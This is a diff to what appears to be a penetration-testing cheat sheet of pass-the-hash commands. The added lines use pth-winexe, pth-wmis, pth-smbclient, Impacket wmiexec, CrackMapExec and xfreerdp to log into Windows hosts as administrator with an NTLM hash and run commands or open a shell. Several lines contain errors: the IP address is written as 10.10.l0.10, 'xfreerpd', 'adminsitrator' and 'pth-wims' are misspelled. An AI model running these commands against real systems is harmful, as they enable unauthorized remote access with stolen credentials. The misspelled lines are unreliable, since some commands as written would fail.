@@ -1,10 +1,20 @@
 # Empty LM hash
 aad3b435b51404eeaad3b435b51404ee
 
-# pth-winexe
-export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
-pth-winexe -U administrator% //10.10.10.10 cmd.exe
+# PTH Toolkit
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561828 && pth-winexe -U administrator% //10.10.10.10 cmd.exe
+pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561828 //10.10.l0.10 cmd.exe
+pth-wims -U administrator%aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561828 //10.10.l0.10 "cmd.exe /c ipconfig > c:\ipconfig.txt"
+pth-smbclient -U administrator%aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561828 //10.10.l0.10/c$
 
-# pth-winexe
-pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 //10.10.l0.10 cmd.exe
-
+# Impacket
+ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561828 administrator@10.10.10.10
+ impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561828 administrator@10.10.10.10
+ 
+ # CrackMapExec
+ crackmapexec 10.11.1.31 -u ralph -H d15e28bbc0c184b2ec60a0e2c5c31845:f8a6deb83ac6c407e04000cf06b9377c --lusers
+ 
+ # XfreeRDP
+ apt-get install freerdp-x11
+ xfreerpd /u:adminsitrator /pth:6F403D3166024568403A94C3A6561828 /v:10.10.10.10
+ 
